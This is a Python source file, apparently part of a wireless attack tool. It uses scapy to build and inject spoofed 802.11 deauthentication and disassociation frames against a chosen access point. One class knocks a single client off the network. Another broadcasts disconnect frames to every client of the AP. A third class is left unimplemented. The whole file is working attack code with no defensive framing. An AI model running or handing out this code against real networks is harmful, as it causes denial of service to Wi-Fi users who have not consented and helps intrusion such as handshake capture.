from itertools import chain

from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth, Dot11Disas

from utils import ChannelFinder, WiFiInterface


class WiFiDeauthAttack(object):
    
    INITIAL_SEQ_NUMBER = 0
    PACKETS_PER_PROBE = 2
    NUM_PROBES = 50    
    
    DEFAULT_DEAUTH_REASON = 3

    def __init__(self, interface, bssid):
        self.interface = WiFiInterface(interface)
        self.bssid = bssid.lower()
        
    def run(self):
        # First, retrieve the channel used by the target AP in order to
        # configure the wireless interface so it can inject deauth packets.
        channel = ChannelFinder(self.interface, self.bssid).find()
        self.interface.set_channel(channel)

        # Finally, run the attack.
        self._do_run()
        
    def _build_packet(self, seq, source, dest, body):
        encoded_seq = seq << 4
        return   RadioTap()\
               / Dot11(SC=encoded_seq, addr1=dest, addr2=source,
                       addr3=self.bssid)\
               / body        
        
    def _build_deauth_packet(self, seq, source, dest):
        body = Dot11Deauth(reason=self.DEFAULT_DEAUTH_REASON)
        return self._build_packet(seq, source, dest, body)

    def _build_disas_packet(self, seq, source, dest):
        body = Dot11Disas(reason=self.DEFAULT_DEAUTH_REASON)
        return self._build_packet(seq, source, dest, body)
    
    def _replicate_and_send(self, packet1, packet2):
        packets = [(packet1, packet2)
                   for _ in range(self.PACKETS_PER_PROBE)]
        packets = list(chain.from_iterable(packets))
        self._send(packets)
          
    def _send(self, packets):
        sendp(packets, iface=self.interface.get_name(), verbose=0)
        
    def _do_run(self):
        raise NotImplementedError


class SingleClientDeauthAttack(WiFiDeauthAttack):
    
    def __init__(self, interface, bssid, client):
        super(SingleClientDeauthAttack, self).__init__(interface, bssid)
        self.client = client
    
    def _do_run(self):
        for seq in xrange(self.INITIAL_SEQ_NUMBER,
                          self.INITIAL_SEQ_NUMBER+self.NUM_PROBES):
            client_packet = self._build_deauth_packet(seq,
                                                      source=self.client,
                                                      dest=self.bssid)
            ap_packet = self._build_deauth_packet(seq,
                                                  source=self.bssid,
                                                  dest=self.client)
            
            self._replicate_and_send(client_packet, ap_packet)


class GlobalDisassociationAttack(WiFiDeauthAttack):
    
    WIFI_BROADCAST_ADDRESS = 'ff:ff:ff:ff:ff:ff'

    def _do_run(self):
        for seq in xrange(self.INITIAL_SEQ_NUMBER,
                          self.INITIAL_SEQ_NUMBER+self.NUM_PROBES):
            deauth_packet = self._build_deauth_packet(seq, source=self.bssid,
                                                      dest=self.WIFI_BROADCAST_ADDRESS)
            disas_packet = self._build_disas_packet(seq, source=self.bssid,
                                                    dest=self.WIFI_BROADCAST_ADDRESS)            

            self._replicate_and_send(deauth_packet, disas_packet)


class MultipleClientDeauthAttack(WiFiDeauthAttack):

    def __init__(self, interface, bssid, timeout):
        super(MultipleClientDeauthAttack, self).__init__(interface, bssid)
        self.timeout = timeout

    def _do_run(self):
        # TODO
        pass